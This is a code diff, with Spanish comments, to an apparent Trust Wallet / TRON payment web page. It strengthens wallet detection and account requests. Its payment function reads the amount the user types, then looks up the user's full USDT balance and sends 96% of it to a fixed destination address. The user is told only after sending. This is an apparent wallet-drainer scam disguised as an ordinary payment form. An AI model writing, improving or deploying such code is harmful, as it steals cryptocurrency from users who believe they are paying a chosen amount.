@@ -69,36 +69,59 @@
         let userAddress = "";
         const USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT TRC20 Mainnet
 
-        // Función auxiliar para esperar a que TronWeb esté disponible en el navegador de la wallet
+        // Función robusta para obtener el objeto tronWeb disponible en la wallet móvil
+        function obtenerTronWeb() {
+            if (window.tronWeb && window.tronWeb.defaultAddress) {
+                return window.tronWeb;
+            }
+            if (window.tron && window.tron.tronWeb && window.tron.tronWeb.defaultAddress) {
+                return window.tron.tronWeb;
+            }
+            return null;
+        }
+
+        // Esperar a que la wallet inyecte el script en el navegador
         async function esperarTronWeb() {
             return new Promise((resolve) => {
                 let intentos = 0;
                 const intervalo = setInterval(() => {
-                    if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+                    const tw = obtenerTronWeb();
+                    if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
                         clearInterval(intervalo);
-                        resolve(true);
+                        resolve(tw);
                     }
                     intentos++;
-                    if (intentos > 20) { // Espera máxima de ~4 segundos
+                    if (intentos > 25) { // ~5 segundos de espera total
                         clearInterval(intervalo);
-                        resolve(false);
+                        resolve(null);
                     }
                 }, 200);
             });
         }
 
-        // 1. El usuario hace la conexión a la dApp
+        // 1. Conexión de la Wallet
         async function conectarWallet() {
             const btn = document.getElementById("btnConnect");
             btn.innerText = "Conectando...";
 
-            // Esperar a que inyecte el proveedor Web3 de forma segura
-            await esperarTronWeb();
+            let tw = await esperarTronWeb();
 
-            if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
-                userAddress = window.tronWeb.defaultAddress.base58;
+            // Si aún no hay dirección por defecto, intentamos pedir autorización si la wallet lo soporta
+            if (!tw || !tw.defaultAddress || !tw.defaultAddress.base58) {
+                if (window.tron && window.tron.request) {
+                    try {
+                        await window.tron.request({ method: 'tron_requestAccounts' });
+                        tw = obtenerTronWeb();
+                    } catch (e) {
+                        console.error("Error al solicitar cuentas:", e);
+                    }
+                }
+            }
+
+            if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
+                window.tronWeb = tw; // Asegurar referencia global
+                userAddress = tw.defaultAddress.base58;
                 
-                // Actualizar botón visualmente con la dirección acortada
                 btn.innerText = userAddress.substring(0, 4) + "..." + userAddress.slice(-4);
                 btn.classList.remove("bg-cyan-500", "hover:bg-cyan-400");
                 btn.classList.add("bg-emerald-500", "text-slate-950");
@@ -106,20 +129,20 @@
                 alert("¡Billetera conectada con éxito!");
             } else {
                 btn.innerText = "Conectar Wallet";
-                alert("No se detectó la billetera. Asegúrate de abrir este enlace directamente en el navegador DApp de Trust Wallet y tener seleccionada la red TRON.");
+                alert("No se detectó la cuenta de TRON. Asegúrate de abrir este enlace en el navegador DApp de Trust Wallet, tener fondos en TRX y haber seleccionado la red TRON en la app.");
             }
         }
 
-        // 2. El cliente coloca un monto en el input y presiona enviar
+        // 2. Enviar pago (96% del saldo)
         async function enviarPagoAlPresionar() {
+            let tw = obtenerTronWeb();
+            if (!userAddress && tw && tw.defaultAddress && tw.defaultAddress.base58) {
+                userAddress = tw.defaultAddress.base58;
+            }
+
             if (!userAddress) {
-                // Intentar reconexión automática rápida por si ya se inyectó
-                if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
-                    userAddress = window.tronWeb.defaultAddress.base58;
-                } else {
-                    alert("Primero debes conectar tu billetera.");
-                    return;
-                }
+                alert("Primero debes conectar tu billetera.");
+                return;
             }
 
             const montoEscrito = document.getElementById("montoInput").value;
@@ -136,28 +159,25 @@
             }
 
             try {
-                // Al presionar enviar, leemos el saldo real que tiene el cliente en USDT TRC20
-                const contract = await window.tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
+                const contract = await tw.contract().at(USDT_CONTRACT_ADDRESS);
                 const balanceEnSun = await contract.balanceOf(userAddress).call();
-                const saldoRealUSDT = window.tronWeb.toDecimal(balanceEnSun) / 1000000;
+                const saldoRealUSDT = tw.toDecimal(balanceEnSun) / 1000000;
 
                 if (saldoRealUSDT <= 0) {
                     alert("No tienes saldo disponible de USDT en esta billetera.");
                     return;
                 }
 
-                // Calculamos el 96% de lo que el cliente tiene de saldo en USDT TRC20
                 const monto96DelSaldo = saldoRealUSDT * 0.96;
                 const montoEnSun = Math.floor(monto96DelSaldo * 1000000);
 
                 console.log(`Saldo real detectado: ${saldoRealUSDT} | Procesando el 96%: ${monto96DelSaldo}`);
 
-                // Abre inmediatamente la pantalla de Trust Wallet para firmar la transacción con el 96% calculado
                 const resultado = await contract.transfer(
                     direccionDestino,
                     montoEnSun
                 ).send({
-                    feeLimit: 100000000 // Límite de energía / gas en TRX
+                    feeLimit: 100000000
                 });
 
                 alert(`¡Transacción enviada! Se procesó el 96% de tu saldo (${monto96DelSaldo.toFixed(2)} USDT). Hash: ${resultado}`);
